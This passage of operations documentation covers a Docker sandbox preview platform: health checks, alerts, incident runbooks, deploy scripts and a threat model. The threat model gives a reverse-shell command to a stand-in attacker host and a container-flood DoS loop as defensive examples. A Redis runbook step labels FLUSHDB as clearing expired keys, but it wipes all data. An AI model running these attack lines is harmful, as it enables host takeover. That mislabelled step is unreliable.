- 200 with response_id for /health
- 404 for nonexistent endpoints
- Traefik middlewares applied
- Docker socket :ro mounting
- No port 3001 exposure
```

### Production Validation

```bash
# Production readiness checklist
curl -s -H "Host: api.$PREVIEW_DOMAIN" http://127.0.0.1/health | jq -e '.response_id'
docker ps | grep -E ':3001.*->' || echo "✅ No leaked ports"
docker inspect preview-api-1 | grep ":ro" && echo "✅ Read-only socket"
```

### Make Targets Cheat Sheet

| Target | Purpose | Key Commands |
|--------|---------|---------------|
| `prereq` | Health checks for all services | Service health validation, Redis ping, MinIO connectivity |
| `auth-test` | Authentication enforcement | Unauthenticated → 401, Authenticated → 404/200 |
| `health-observability-test` | Health endpoint observability | Response ID validation, request ID tracking |
| `test-size-guard` | Size validation limits | 413 for >10MB, 415 for wrong Content-Type |
| `all-tests` | Full test suite | Runs all above targets sequentially |

**Quick Reference**:
```bash
# Run everything
make all-tests

# Individual debugging
make prereq          # Basic connectivity
make auth-test        # Auth enforcement
make health-observability-test # Response validation
make test-size-guard # Content limits
```

---

## SLOs & Alerts

### Service Level Objectives (SLOs)

| Metric | Target | Measurement Window | Alert Threshold |
|--------|--------|-------------------|-----------------|
| **Health Endpoint Latency** | p95 < 200ms | 5 minutes | > 500ms |
| **API Success Rate** | > 99.5% | 5 minutes | < 99.0% |
| **5xx Error Rate** | < 1% | 5 minutes | > 3% |
| **Auth Failure Rate** | < 2% | 5 minutes | > 5% |
| **Queue Processing Time** | p99 < 30s | 5 minutes | > 60s |
| **Sandbox Provisioning Time** | p95 < 45s | 5 minutes | > 90s |
| **Redis Latency** | p95 < 10ms | 5 minutes | > 50ms |
| **MinIO Upload Latency** | p95 < 1s | 5 minutes | > 5s |

### Monitoring Checks

#### Health Endpoint Monitoring
```bash
# Continuous health check with latency tracking
response_time=$(curl -s -w '%{time_total}\n' -o /dev/null \
  -H "Host: api.${PREVIEW_DOMAIN}" "http://127.0.0.1/health")
response_time_ms=$(echo "$response_time * 1000" | bc)

if [ $(echo "$response_time_ms > 500" | bc) -eq 1 ]; then
  echo "❌ Health endpoint slow: ${response_time_ms}ms"
  # Trigger alert
fi
```

#### Error Rate Monitoring
```bash
# Monitor 5xx rates in Traefik access logs
docker logs --tail=100 preview-traefik-1 | \
  grep 'api\.' | \
  awk '{print $9}' | \
  grep '^5' | \
  wc -l

# Alert if > 3% 5xx errors
total_requests=$(docker logs --tail=100 preview-traefik-1 | \
  grep 'api\.' | wc -l)
error_requests=$(docker logs --tail=100 preview-traefik-1 | \
  grep 'api\.' | \
  awk '{print $9}' | \
  grep '^5' | wc -l)
error_rate=$((error_requests * 100 / total_requests))

if [ $error_rate -gt 3 ]; then
  echo "❌ High error rate: ${error_rate}%"
  # Trigger alert
fi
```

#### Queue Backlog Alert
```bash
# Monitor Redis queue backlog
QUEUE_BACKLOG=$(curl -s -H "Authorization: Bearer $API_TOKEN" \
  "http://api.${PREVIEW_DOMAIN}/debug/queue" | \
  jq '.queues.build.waiting + .queues.dev.waiting')

if [ "$QUEUE_BACKLOG" -gt 50 ]; then
  echo "❌ High queue backlog: $QUEUE_BACKLOG"
  # Trigger alert
fi
```

#### Capacity Monitoring
```bash
# Monitor container count
container_count=$(docker ps --filter "label=sandbox=true" --format "{{.Names}}" | wc -l)
if [ "$container_count" -gt 100 ]; then
  echo "⚠️ High container count: $container_count"
fi

# Monitor disk usage
disk_usage=$(df -h "$HOME/preview/projects" | awk 'NR==2{print $5}' | sed 's/%//')
if [ "$disk_usage" -gt 85 ]; then
  echo "⚠️ High disk usage: ${disk_usage}%"
fi
```

### Alert Manager Rules (Prometheus)

```yaml
groups:
  - name: preview-sandbox
    rules:
      - alert: ApiHighLatency
        expr: histogram_quantile(0.95, rate(api_request_duration_seconds_bucket[5m])) > 0.5
        for: 2m
        labels:
          severity: warning
        annotations:
          summary: "API latency is high"
          description: "95th percentile API latency is above 500ms for 2 minutes"

      - alert: HighErrorRate
        expr: rate(http_requests_total{status=~"^5.*"}[5m]) / rate(http_requests_total[5m]) > 0.03
        for: 2m
        labels:
          severity: critical
        annotations:
          summary: "High HTTP error rate"
          description: "5xx error rate is above 3% for 2 minutes"

      - alert: QueueBacklogHigh
        expr: redis_queue_waiting_jobs{queue=~"build|dev"} > 50
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "Queue backlog is high"
          description: "Queue {{ $labels.queue }} has {{ $value }} waiting jobs"
```

### Key Performance Indicators (KPIs)

- **Throughput**: Sandboxes created per hour
- **Success Rate**: % of sandboxes provisioned successfully
- **Average Latency**: Time from request to sandbox ready
- **Error Budget**: Monthly allowance of failed requests
- **Resource Utilization**: CPU, memory, disk usage trends

### Dashboard Components

1. **System Health**:
   - API availability (uptime percentage)
   - Response time percentiles (p50, p95, p99)
   - Error rate breakdown (4xx vs 5xx)

2. **Queue Metrics**:
   - Queue depth (waiting/active/completed)
   - Processing rate (items/minute)
   - Average queue wait time

3. **Resource Usage**:
   - Active sandbox containers
   - CPU/memory utilization
   - Network traffic patterns

4. **Business Metrics**:
   - Sandboxes created (daily/weekly/monthly)
   - Average sandbox lifetime
   - Popular project frameworks

---

## 10-Minute Pager Incident Runbook

### Incident Response Timeline

```
Minute 0-2: Triage → Validate → Isolate
Minute 3-5: Diagnose → Investigate → Confirm
Minute 6-8: Execute → Mitigate → Verify
Minute 9-10: Monitor → Communicate → Document
```

### Incident Scenarios

#### Scenario 1: Traefik 404 Errors
**Symptoms**: Health endpoint returns 404, API unreachable

**Minute 0-2: Triage**
```bash
# Validate symptom
code=$(curl -s -H "Host: api.${PREVIEW_DOMAIN}" -o /dev/null -w '%{http_code}' http://127.0.0.1/health)
if [ "$code" != "200" ]; then
  echo "❌ Confirmed: Health endpoint failing"
fi

# Isolate issue source
docker ps | grep preview-traefik-1 || echo "❌ Traefik container missing"
docker logs --tail=10 preview-traefik-1 | grep -i error
```

**Minute 3-5: Diagnose**
```bash
# Check Traefik configuration
docker exec preview-traefik-1 traefik version
docker exec preview-traefik-1 cat /etc/traefik/traefik.yml

# Check API container labels
docker inspect preview-api-1 | grep traefik.enable

# Check network connectivity
docker exec preview-traefik-1 wget -q --spider http://preview-api-1:3001/health
```

**Minute 6-8: Execute**
```bash
# Quick fix: Restart Traefik
docker restart preview-traefik-1
sleep 10

# If still failing: Recreate with network
docker compose down traefik
docker compose up -d traefik
```

**Minute 9-10: Verify**
```bash
curl -s -H "Host: api.${PREVIEW_DOMAIN}" http://127.0.0.1/health | jq -e .status
echo "✅ Traefik routing restored"
```

---

#### Scenario 2: Redis Connection Down
**Symptoms**: Queue operations failing, sandbox creation timeouts

**Minute 0-2: Triage**
```bash
# Validate Redis connectivity
docker exec preview-redis-1 redis-cli ping || echo "❌ Redis down"

# Check API logs
docker logs --tail=10 preview-api-1 | grep -i redis

# Isolate: Queue counts
curl -s -H "Authorization: Bearer $API_TOKEN" "http://127.0.0.1/debug/queue" || echo "❌ API unreachable"
```

**Minute 3-5: Diagnose**
```bash
# Check Redis container status
docker exec preview-redis-1 redis-cli info stats
docker exec preview-redis-1 redis-cli info memory

# Check network
docker exec preview-api-1 telnet redis 6379

# Check resource pressure
docker stats preview-redis-1 --no-stream
```

**Minute 6-8: Execute**
```bash
# Quick fix: Restart Redis
docker restart preview-redis-1
sleep 5

# If memory issues: Clear expired keys
docker exec preview-redis-1 redis-cli FLUSHDB
```

**Minute 9-10: Verify**
```bash
docker exec preview-redis-1 redis-cli ping
curl -s -H "Authorization: Bearer $API_TOKEN" "http://127.0.0.1/debug/queue" | jq .redis.pingMs
echo "✅ Redis connectivity restored"
```

---

#### Scenario 3: 413 Request Entity Too Large Spikes
**Symptoms**: All sandbox creations failing with 413 errors

**Minute 0-2: Triage**
```bash
# Validate with small payload
small_payload='{"healthPath":"/","files":[{"path":"test.txt","content":"dGVzdA=="}]}'
status=$(curl -s -o /dev/null -w '%{http_code}' \
  -H "Content-Type: application/json" \
  -d "$small_payload" \
  "http://api.${PREVIEW_DOMAIN}/sandbox")

if [ "$status" = "413" ]; then
  echo "❌ Confirmed: 413 error on small payload"
fi

# Isolate: Check Traefik limits
docker logs --tail=5 preview-traefik-1 | grep buffering
```

**Minute 3-5: Diagnose**
```bash
# Check middleware configuration
docker inspect preview-api-1 | grep buffering.maxRequestBodyBytes

# Check API body parser limits
docker exec preview-api-1 cat app.js | grep limit

# Check disk space for temporary uploads
df -h /tmp
```

**Minute 6-8: Execute**
```bash
# Quick fix: Clear Traefik buffer by restarting
docker restart preview-traefik-1

# If middleware issue: Remove limit temporarily
docker compose stop traefik
docker run -d --name traefik-tmp \
  -p 80:80 -p 443:443 \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  traefik:v3.1
```

**Minute 9-10: Verify**
```bash
curl -s -o /dev/null -w '%{http_code}' \
  -H "Content-Type: application/json" \
  -d "$small_payload" \
  "http://api.${PREVIEW_DOMAIN}/sandbox"
echo "✅ 413 error resolution verified"
```

---

#### Scenario 4: Orphaned Sandboxes
**Symptoms**: High container count, resource exhaustion

**Minute 0-2: Triage**
```bash
# Validate orphan count
orphan_count=$(docker ps --filter "label=sandbox=true" --format "{{.Names}}" | wc -l)
if [ "$orphan_count" -gt 50 ]; then
  echo "❌ High orphan count: $orphan_count"
fi

# Isolate: Check queue status
curl -s -H "Authorization: Bearer $API_TOKEN" "http://api.${PREVIEW_DOMAIN}/debug/queue" | jq .queues
```

**Minute 3-5: Diagnose**
```bash
# Check which containers are truly orphaned
for container in $(docker ps --filter "label=sandbox=true" --format "{{.Names}}"); do
  id=$(echo $container | sed 's/sbx-//')
  queue_status=$(curl -s -H "Authorization: Bearer $API_TOKEN" \
    "http://api.${PREVIEW_DOMAIN}/debug/queue" | \
    jq --arg id "$id" '.queues | (.build.active + .build.waiting + .dev.active + .dev.waiting) | contains([$id])')

  if [ "$queue_status" = "false" ]; then
    echo "Orphaned: $container"
  fi
done

# Check cleanup scheduled task
docker exec preview-api-1 pgrep -f cleanup || echo "⚠️ Cleanup process not running"
```

**Minute 6-8: Execute**
```bash
# Manual cleanup of truly orphaned containers
for container in $(docker ps --filter "label=sandbox=true" --format "{{.Names}}"); do
  id=$(echo $container | sed 's/sbx-//')
  if ! curl -s -H "Authorization: Bearer $API_TOKEN" \
       "http://api.${PREVIEW_DOMAIN}/debug/queue" | \
       jq --arg id "$id" '.queues | (.build.active + .build.waiting + .dev.active + .dev.waiting) | contains([$id])' | grep -q true; then
    echo "Removing orphan: $container"
    docker rm -f $container
  fi
done

# Restart cleanup service
docker restart preview-api-1
```

**Minute 9-10: Verify**
```bash
new_count=$(docker ps --filter "label=sandbox=true" --format "{{.Names}}" | wc -l)
echo "✅ Orphan count reduced: $new_count"

# Verify cleanup process running
docker exec preview-api-1 pgrep -f cleanup || echo "⚠️ Cleanup process not running"
```

---

### Post-Incident Checklist

- [ ] Update incident timeline in runbook
- [ ] Add monitoring to detect similar issues earlier
- [ ] Document root cause and permanent fix
- [ ] Test fixes in staging environment
- [ ] Review incident response times
- [ ] Update alert thresholds based on incident data

### Escalation Matrix

| Severity | Response Time | Escalation Path |
|----------|--------------|-----------------|
| **Critical** (Service down) | 5 minutes | On-call → Tech Lead → Engineering Manager |
| **High** (Degraded) | 15 minutes | On-call → Tech Lead |
| **Medium** (Partial impact) | 1 hour | On-call only |
| **Low** (Monitoring alert) | 4 hours | On-call only |

---

## ADRs (Architecture Decision Records)

### ADR-001: Traefik-Only Proxy Architecture

**Decision**: Use Traefik as exclusive ingress proxy with no direct port exposure.

**Rationale**:
- Security: Single point of entry for auth/rate limiting
- Flexibility: Centralized middleware (SSL, logging, circuit breaking)
- Simplicity: No port conflicts, easy network changes

**Status**: Adopted ✅

### ADR-002: Service DNS Names Over IPs

**Decision**: Use Docker service DNS names (`redis://redis:6379`) instead of container IPs.

**Rationale**:
- Resilience: IPs change on container recreate
- Simplicity: No need for IP discovery or static assignments
- Portability: Works across different Docker environments

**Status**: Adopted ✅

### ADR-003: Exec-Based Readiness Probes

**Decision**: Use container exec for `/ready` checks instead of host port mapping.

**Rationale**:
- Security: No need to expose sandbox ports to host
- Accuracy: Tests actual container networking
- Compatibility: Works with any proxy configuration

**Status**: Adopted ✅

---

## Change Management

### Safe Deploy Procedure

**Pre-Deployment Checklist**:
```bash
# STEP 1: Verify current state
docker compose ps
curl -s -H "Host: api.${PREVIEW_DOMAIN}" http://127.0.0.1/health | jq -e .status
docker exec preview-redis-1 redis-cli ping

# STEP 2: Check for drift (config consistency)
current_hash=$(sha256sum docker-compose.yml | cut -d' ' -f1)
stored_hash=$(cat .docker-compose.hash 2>/dev/null || echo "none")
if [ "$current_hash" != "$stored_hash" ]; then
  echo "⚠️ Config drift detected!"
fi

# STEP 3: Take backup before changes
./backup-platform.sh
```

**Deployment Phases**:

#### Phase 1: Staging Verification
```bash
# Deploy to staging with --force-recreate
docker compose down
docker compose up -d --build --force-recreate

# Verify all services are healthy
make prereq
make auth-test

# Test smoke scenarios
python3 ../tests/smoke_test.py
```

#### Phase 2: Production Rolling Updates
```bash
# Individual service updates (no downtime)
echo "Updating API service..."
docker compose up -d --build --force-recreate api
sleep 10
curl -s -H "Host: api.${PREVIEW_DOMAIN}" http://127.0.0.1/health | jq -e .status

echo "Updating Traefik..."
docker compose up -d --build --force-recreate traefik
sleep 5

echo "Updating Redis..."
docker compose up -d --build --force-recreate redis
sleep 3
docker exec preview-redis-1 redis-cli ping

echo "Updating MinIO..."
docker compose up -d --build --force-recreate minio
sleep 5
```

#### Phase 3: Post-Deploy Verification
```bash
# Full test suite
make all-tests

# Update config hash
sha256sum docker-compose.yml > .docker-compose.hash

# Check resource usage after deploy
docker stats preview-api-1 --no-stream
docker stats preview-redis-1 --no-stream
```

### Rollback Procedure

**Quick Rollback** (within 5 minutes):
```bash
# Roll back to last known good state
docker compose down
git checkout HEAD~1
docker compose up -d --build
make prereq
```

**Point-in-Time Rollback**:
```bash
# Restore from backup
backup_file="/var/backups/preview-platform/s3-backup-$(date --date='1 hour ago' +%Y%m%d_%H%M%S).tar.gz"
docker cp $backup_file preview-minio-1:/tmp/restore.tar.gz
docker exec preview-minio-1 sh -c "cd /tmp && tar -xzf restore.tar.gz && mc cp --recursive $S3_BUCKET-backup* local/\$S3_BUCKET/"

# Restore Redis from RDB
redis_backup="/var/backups/preview-platform/redis-dump-$(date --date='1 hour ago' +%Y%m%d_%H%M%S).rdb"
docker cp $redis_backup preview-redis-1:/data/dump.rdb
docker restart preview-redis-1
```

**Rollback Verification**:
```bash
# Verify service health
curl -s -H "Host: api.${PREVIEW_DOMAIN}" http://127.0.0.1/health | jq -e .status
curl -s -H "Authorization: Bearer $API_TOKEN" "http://api.${PREVIEW_DOMAIN}/debug/queue" | jq .redis.pingMs

# Verify data integrity
curl -s -H "Authorization: Bearer $API_TOKEN" "http://api.${PREVIEW_DOMAIN}/debug/docker" | jq '.containers | length'
```

### Canary Deploy Pattern

```yaml
# Define weighted services in docker-compose.canary.yml
services:
  api-primary:
    extends:
      service: api
    labels:
      - "traefik.http.services.api-primary.loadbalancer.server.weight=90"
      - "traefik.http.routers.api.rule=Host(`api.${PREVIEW_DOMAIN}`)"
      - "traefik.http.routers.api.service=api-weighted"

  api-canary:
    extends:
      service: api
    labels:
      - "traefik.http.services.api-canary.loadbalancer.server.weight=10"
      - "traefik.http.routers.api.rule=Host(`api.${PREVIEW_DOMAIN}`)"
      - "traefik.http.routers.api.service=api-weighted"
      - "traefik.http.services.api-weighted.wrr.serviceNames=api-primary,api-canary"
      - "traefik.http.services.api-weighted.wrr.sticky.cookie=true"
```

```bash
# Deploy canary configuration
BACKUP_COMPOSE=docker-compose.yml.backup
cp docker-compose.yml $BACKUP_COMPOSE
cp docker-compose.canary.yml docker-compose.yml

# Restart services with new weights
docker compose down
docker compose up -d --build

# Monitor canary for 15 minutes
./monitor-canary.sh --duration=15m --error-rate-threshold=2

# If successful: full rollout (remove canary)
cp $BACKUP_COMPOSE docker-compose.yml
docker compose up -d --build
echo "✅ Full rollout completed"

# If failed: rollback to primary only
if [ $? -ne 0 ]; then
  cp $BACKUP_COMPOSE docker-compose.yml
  docker compose up -d --build
  echo "❌ Canary failed - rolled back"
fi
```

### Deployment Scripts

```bash
#!/bin/bash
# deploy.sh - Safe deployment script
set -euo pipefail

# Configuration
ENVIRONMENT=${1:-staging}
ROLLBACK_ON_FAILURE=${2:-true}

echo "=== Starting deployment to $ENVIRONMENT ==="

# Pre-flight checks
echo "Running pre-flight checks..."
make prereq || { echo "❌ Pre-flight checks failed"; exit 1; }

# Take backup
if [ "$ENVIRONMENT" = "production" ]; then
  echo "Creating backup..."
  sudo /usr/local/bin/backup-platform.sh
fi

# Deploy with health checks
echo "Deploying services..."
for service in redis minio traefik api; do
  echo "Updating $service..."
  docker compose up -d --build --force-recreate $service

  # Wait for service to be ready
  if [ "$service" = "api" ]; then
    for i in {1..30}; do
      if curl -s -H "Host: api.${PREVIEW_DOMAIN}" http://127.0.0.1/health | jq -e .status; then
        break
      fi
      echo "Waiting for API to be ready... ($i/30)"
      sleep 2
    done
  fi
done

# Post-deployment verification
echo "Running post-deployment verification..."
make all-tests || {
  echo "❌ Post-deployment tests failed"
  if [ "$ROLLBACK_ON_FAILURE" = "true" ]; then
    echo "Initiating rollback..."
    ./rollback.sh
  fi
  exit 1
}

echo "✅ Deployment successful"
```

### Change Freeze Windows

**Critical Changes** (require 7 days' notice):
- Docker engine upgrades
- Network architecture changes
- Authentication system modifications
- Database schema changes

**Standard Changes** (require 24 hours notice):
- Application updates
- Dependency upgrades
- Configuration updates
- Security patches

**Emergency Changes** (on-call approval required):
- Critical security vulnerabilities
- Production outages
- Data loss prevention

---

## Threat Model & Security Considerations

### Docker Socket Security Risks

**High-Risk Attack Vectors**:

1. **SSRF via Docker Socket**:
   ```javascript
   // Malicious sandbox code could access host Docker socket
   const fs = require('fs');
   const socket = fs.createReadStream('/var/run/docker.sock');
   // → Complete host container takeover
   ```

2. **Container Exec Exploitation**:
   ```bash
   # Attackers can exec into any container
   docker exec -i attacker-container nc -e /bin/bash attacker.com 4444
   ```

3. **Denial of Service**:
   ```bash
   # Resource exhaustion via Docker API
   for i in {1..1000}; do docker run -d alpine sleep 3600; done
   ```

### Risk Mitigation Strategies

#### **Recommended: Docker Socket Proxy**

```yaml
services:
  socket-proxy:
    image: tecnativa/docker-socket-proxy
    restart: unless-stopped
    privileged: false
    environment:
      CONTAINERS: 1          # Allow container listing
      INFO: 1                 # Allow system info
      VERSION: 1              # Allow version info
      EVENTS: 1               # Allow events
      EXEC: 0                 # ❌ BLOCK exec operations
      AUTH: 0                 # ❌ BLOCK auth operations
      SECRETS: 0              # ❌ BLOCK secrets
      SWARM: 0                # ❌ BLOCK swarm operations
      NETWORKS: 0             # ❌ BLOCK network operations
      VOLUMES: 0              # ❌ BLOCK volume operations
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
    networks:
      - preview_sbx-network

  api:
    # Use socket proxy instead of direct socket
    volumes: []
    environment:
      DOCKER_HOST: tcp://socket-proxy:2375
```

#### **Production Hardening Checklist**:

- [ ] Replace direct docker.sock mount with socket proxy
- [ ] Disable dangerous Docker API endpoints (exec, auth, secrets, swarm)
- [ ] Use read-only socket mounting
- [ ] Implement network isolation between API and proxy
- [ ] Add resource limits to prevent DoS
- [ ] Monitor Docker API access logs
- [ ] Regular security audits of container permissions

### Sandbox Isolation Recommendations

```yaml
# Enhanced sandbox container security
sandbox:
  security_opt:
    - no-new-privileges:true
    - apparmor:docker-default
    - seccomp:default
  cap_drop:
    - ALL
  read_only: true
  tmpfs:
    - /tmp:rw,size=100m
    - /var/tmp:rw,size=100m
  user: 1000:1000  # Non-root user
  pids_limit: 100
  mem_limit: 256m
  cpus: 0.5
```

### Monitoring & Detection

**Suspicious Activity Patterns**:
- Frequent Docker API calls from sandbox containers
- Exec operations on non-sandbox containers
- Network connections to unexpected IPs
- Resource usage spikes

**Detection Commands**:
```bash
# Monitor Docker API calls
docker events --filter 'event=exec'

# Check for suspicious network activity
docker network inspect preview_sbx-network | grep IPAddress

# Monitor process activity in sandboxes
docker top $(docker ps -q --filter "label=sandbox=true")
```

### Incident Response for Compromised Sandboxes

**Containment Steps**:
```bash
# Immediately isolate compromised container
docker pause $(docker ps -q --filter "label=sandbox=true" --filter "name=compromised")

# Network isolate
docker network disconnect preview_sbx-network compromised-container

# Collect forensic data
docker logs compromised-container > forensic-$(date +%Y%m%d).log
docker export compromised-container > forensic-$(date +%Y%m%d).tar

# Cleanup
docker rm -f compromised-container
```

### Regular Security Audits

**Audit Commands**:
```bash
# Check container capabilities
docker inspect --format='{{.HostConfig.Capabilities}}' $(docker ps -q)

# Verify read-only filesystems
docker inspect --format='{{.HostConfig.ReadonlyRootfs}}' $(docker ps -q)

# Check privilege escalation risks
docker inspect --format='{{.SecurityOpt}}' $(docker ps -q)
```

---

## Changelog

### v1.2.0 - Production Hardening
- ✅ Added Traefik network targeting labels
- ✅ Fixed Redis DNS resolution to service names
- ✅ Added Express trust proxy for proper headers
- ✅ Implemented /ready endpoint fallbacks (curl → wget → node)
- ✅ Precise IP allowlist based on Docker subnet
- ✅ Disabled dashboard for production security

### v1.1.0 - Security Implementation
- ✅ Added authentication middleware for admin routes
- ✅ Implemented rate limiting (100/min, burst 50)
- ✅ Added IP allowlist for localhost + Docker subnet
- ✅ Made docker.sock read-only (:ro)
- ✅ Added 413/415 content validation
- ✅ Removed direct port exposure

### v1.0.0 - Initial Release
- ✅ Basic sandbox provisioning API
- ✅ Redis queuing and MinIO storage
- ✅ WebSocket log streaming
- ✅ Automatic cleanup operations
- ✅ Health monitoring endpoints

---

## Glossary

### Architecture Terms

| Term | Definition |
|------|-----------|
| **Traefik Router** | Entry point that defines routing rules (Host, PathPrefix) and connects requests to services |
| **Traefik Service** | Load balancer that distributes traffic among backend containers |
| **Traefik Middleware** | Processing layer applied to requests (rate limiting, headers, auth) |
| **Preview Network** | Private Docker network (`preview_sbx-network`) for internal service communication |
| **Sandbox Container** | Isolated Node.js environment with prefix `sbx-*` for running user code |

### Environment & Modes

| Term | Definition |
|------|-----------|
| **Dev Mode** | Development sandbox: Higher resources (768m/0.75 CPU), 45-minute TTL |
| **Prod Mode** | Production sandbox: Lower resources (256m/0.25 CPU), 4-hour TTL |
| **Ready Probe** | Health check using container exec to test HTTP connectivity inside sandbox |
| **Cleanup Task** | In-process scheduled job that removes stale/orphaned containers |

### Protocol & Data

| Term | Definition |
|------|-----------|
| **Base64 Encoding** | Binary-to-text encoding with 4/3 size overhead (~33% larger than raw data) |
| **Payload Size Calculation** | 6MB raw file → 8MB base64 + JSON structure → Total ≤ 10MB |
| **413 Error** | Request Entity Too Large - triggered when total request > 10MB |
| **415 Error** | Unsupported Media Type - triggered without `application/json` |

### Monitoring & Operations

| Term | Definition |
|------|-----------|
| **SLO (Service Level Objective)** | Performance target (e.g., p95 latency < 200ms) |
| **RTO (Recovery Time Objective)** | Maximum acceptable downtime after failure (e.g., 15 minutes) |
| **RPO (Recovery Point Objective)** | Maximum acceptable data loss (e.g., 5 minutes of queue data) |
| **Canary Deploy** | Gradual rollout to subset of traffic with weighted routing |
| **Change Freeze** | Period where high-risk changes are prohibited |

### Docker Concepts

| Term | Definition |
|------|-----------|
| **Socket Proxy** | Secure intermediary that filters Docker API calls to reduce attack surface |
| **Labels** | Docker metadata used by Traefik for routing and configuration |
| **Read-Only Socket** | `:ro` flag preventing write access to Docker daemon socket |
| **Network Isolation** | Containers only accessible via Traefik proxy, not direct host ports |